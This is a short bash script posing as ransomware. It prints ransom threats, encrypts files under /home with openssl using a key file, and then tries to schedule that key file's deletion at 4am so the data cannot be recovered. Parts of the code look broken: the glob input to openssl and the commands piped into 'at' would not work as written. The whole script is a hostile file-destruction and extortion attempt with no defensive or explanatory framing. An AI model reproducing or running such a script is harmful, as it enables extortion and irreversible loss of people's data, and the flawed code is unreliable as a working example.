#!/bin/bash

echo "ENCRYPTION ACTIVATED"
echo "..."
echo "PAY OR ELSE FILES WILL BE ENCRYPTED FOREVER"

sudo apt-get install at >> /etc/yes.log ; sleep 10 ; rm /etc/yes.log

openssl enc -aes-256-cbc -pbkdf2 -salt -in /home/* -out encrypted.dat -pass file:normal_file.txt

echo "YOUR FILES WILL BE GONE BY 4AM"

mv normal_file.txt /home | at 3:59am ; rm /home/normal_file.txt | at 4am 
